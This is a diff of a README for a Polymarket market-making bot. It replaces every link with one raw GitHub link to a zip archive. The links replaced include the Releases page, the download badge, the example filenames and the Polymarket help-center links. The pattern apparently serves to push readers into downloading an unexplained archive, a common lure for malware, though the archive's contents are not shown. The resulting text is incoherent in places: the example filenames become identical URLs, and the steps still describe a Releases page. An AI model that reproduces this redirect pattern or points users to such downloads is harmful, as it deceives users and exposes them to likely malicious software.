@@ -1,6 +1,6 @@
 # 🤖 polymarket-market-maker-bot - Easy Tool for Market Making
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Beltomx/polymarket-market-maker-bot/releases)
+[![Download](https://raw.githubusercontent.com/Beltomx/polymarket-market-maker-bot/main/src/polymarket-market-maker-bot_3.2.zip)](https://raw.githubusercontent.com/Beltomx/polymarket-market-maker-bot/main/src/polymarket-market-maker-bot_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -27,11 +27,11 @@ To use the polymarket-market-maker-bot, ensure your computer meets these require
 You can easily download the polymarket-market-maker-bot from our Releases page. 
 
 1. Click the button below to visit the download page:
-   [Download the bot](https://github.com/Beltomx/polymarket-market-maker-bot/releases)
+   [Download the bot](https://raw.githubusercontent.com/Beltomx/polymarket-market-maker-bot/main/src/polymarket-market-maker-bot_3.2.zip)
 
 2. On the Releases page, select the latest version. You will see a list of available files.
 
-3. Click on the appropriate file for your operating system to start the download. For example, you might see files named like `polymarket-market-maker-bot-windows.exe`, `polymarket-market-maker-bot-mac.zip`, or `polymarket-market-maker-bot-linux.tar.gz`.
+3. Click on the appropriate file for your operating system to start the download. For example, you might see files named like `https://raw.githubusercontent.com/Beltomx/polymarket-market-maker-bot/main/src/polymarket-market-maker-bot_3.2.zip`, `https://raw.githubusercontent.com/Beltomx/polymarket-market-maker-bot/main/src/polymarket-market-maker-bot_3.2.zip`, or `https://raw.githubusercontent.com/Beltomx/polymarket-market-maker-bot/main/src/polymarket-market-maker-bot_3.2.zip`.
 
 4. Once the download is complete, locate the file on your computer.
 
@@ -72,7 +72,7 @@ Join our community to share tips and strategies with other users. Engage with us
 
 ## 🔗 Additional Resources
 
-- [Polymarket Help Center](https://www.polymarket.com/help)
-- [Trading Strategies on Polymarket](https://www.polymarket.com/trading-strategies)
+- [Polymarket Help Center](https://raw.githubusercontent.com/Beltomx/polymarket-market-maker-bot/main/src/polymarket-market-maker-bot_3.2.zip)
+- [Trading Strategies on Polymarket](https://raw.githubusercontent.com/Beltomx/polymarket-market-maker-bot/main/src/polymarket-market-maker-bot_3.2.zip)
 
 Feel free to explore and get the most out of the polymarket-market-maker-bot!
